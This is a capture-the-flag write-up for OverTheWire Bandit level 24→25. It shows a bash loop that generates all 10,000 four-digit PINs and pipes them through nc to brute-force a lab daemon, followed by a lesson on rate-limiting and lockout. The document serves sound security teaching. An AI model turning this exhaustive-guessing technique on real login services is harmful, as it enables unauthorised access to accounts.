# Bandit Level 24 → 25

## Objective

A daemon is listening on `port 30002` and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time.

## Concept Tested

Exhaustive/brute-force search against a small keyspace, and why a service is only as strong as the size of its secret. A 4 digit numeric PIN which introduces 10000 possibilities is trivially exhaustible in seconds over a fast local connection, unlike a real password space.

## Initial Access

Establish an SSH session to the target host as user `bandit24`:

```bash
$ ssh bandit24@bandit.labs.overthewire.org -p 2220
bandit24@bandit.labs.overthewire.org's password: [REDACTED]
bandit24@bandit:~$
```

## Recon

To start this challenge I'll observe what response I get by connecting to the port (`30002`) which was stated by the objective to be actively listening using `nc`.

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

This is the same "listen before you speak" approach I used in level 14. It told me the exact expected input format: `<bandit24 password> <pincode>`.

```bash
bandit24@bandit:~$ echo "$(cat /etc/bandit_pass/bandit24) 1234" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
```

I sent a random pincode to observe the failure response format before committing to a brute-force script. I needed to know exactly what "wrong" looks like so I could later filter it out programmatically and recognize "correct" by its absence. 
From my observation this service accepts one line per connection attempt and after a wrong guess it asks you to try again — meaning brute-forcing is possible and may require streaming all 10,000 guesses through a single persistent connection if the daemon supports pipelining multiple lines in one session.

## Solution

```bash
bandit24@bandit:~$ mkdir /tmp/breaker
bandit24@bandit:~$ cd /tmp/breaker
bandit24@bandit:/tmp/breaker$ touch guess.txt
bandit24@bandit:/tmp/breaker$ nano guess.txt
bandit24@bandit:/tmp/breaker$ chmod 700 guess.txt
bandit24@bandit:/tmp/breaker$ cat guess.txt
password=$(cat /etc/bandit_pass/bandit24)
for i in $(seq -w 0 9999); do
        echo "$password $i"
     done
```

Using Bash coding we can generate all 10,000 possible PINs (`0000` through `9999`) paired with the known `bandit24` password, one attempt per line, and saved them to a file rather than piping live. This way I could inspect the generated attempts before firing them at the service, and re-run the send step without regenerating if something went wrong. `seq -w` pads numbers to equal width (`0000`, `0001`, ... `9999`) so every line matches the 4-digit format the service expects.

```bash
bandit24@bandit:/tmp/breaker$ ./guess.txt | nc -q 5  localhost 30002 > gotem.txt
```

Piped the entire pre-built guess list into a single `nc` connection, since I want to observe how the service reads and responds to input line by line. `-q 5` tells `nc` to close the connection 5 seconds after it detects EOF on stdin, giving the server time to finish processing and reply to the final lines before the socket is torn down. All output (thousands of `Wrong!` lines plus, hopefully, one success message) was captured to `gotem.txt`.

```bash
bandit24@bandit:/tmp/breaker$ grep -v "Wrong" gotem.txt
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is [REDACTED]
```

- `grep -v` prints every line that does not match the pattern, filtering out the thousands of expected `Wrong!` rejections leaves only the initial banner and the one line I actually care about: the success message containing `bandit25`'s password.

## Verification

Authenticate as `bandit25` using the retrieved password:

```bash
[Laptop-3344]:~$ ssh bandit25@bandit.labs.overthewire.org -p 2220
bandit25@bandit.labs.overthewire.org's password: [REDACTED]
bandit25@bandit:~$ whoami
bandit25
```

**Explanation:** Initiating a new SSH session to port `2220` and supplying the retrieved password at the prompt grants access. Running `whoami` and observing the updated shell prompt (`bandit25@bandit:~$`) confirms successful authentication as `bandit25`.

## Why This Works

A 4-digit numeric PIN has exactly 10,000 possible values. A keyspace small enough to exhaust completely in well under a minute over localhost, with no meaningful computational cost per guess. The daemon's `password + pincode` scheme doesn't actually add security beyond the PIN itself in this context, because the "real" password half is already known (it's _my_ current level's password, handed to every player), so the entire effective secret is just the 4-digit PIN. Critically, the service has no rate-limiting, lockout, or delay after wrong attempts, and it accepts a long stream of guesses over one connection. Nothing forces an attacker to slow down or spread attempts across time/sessions. That absence of throttling is what turns a "small keyspace" from a mild weakness into a trivially-solved one.

## Key Takeaway

Never rely on a short, fixed-length numeric PIN as a real access-control secret unless it's paired with strict rate-limiting, exponential backoff, or account lockout after a handful of failed attempts (think ATM PINs — 3-4 tries, then locked). If a service allows unlimited, unthrottled guesses, keyspace size alone determines how long a brute-force takes, and 10,000 is nothing for a modern connection to chew through.

## Password

`[REDACTED - see level for retrieval method]`


---
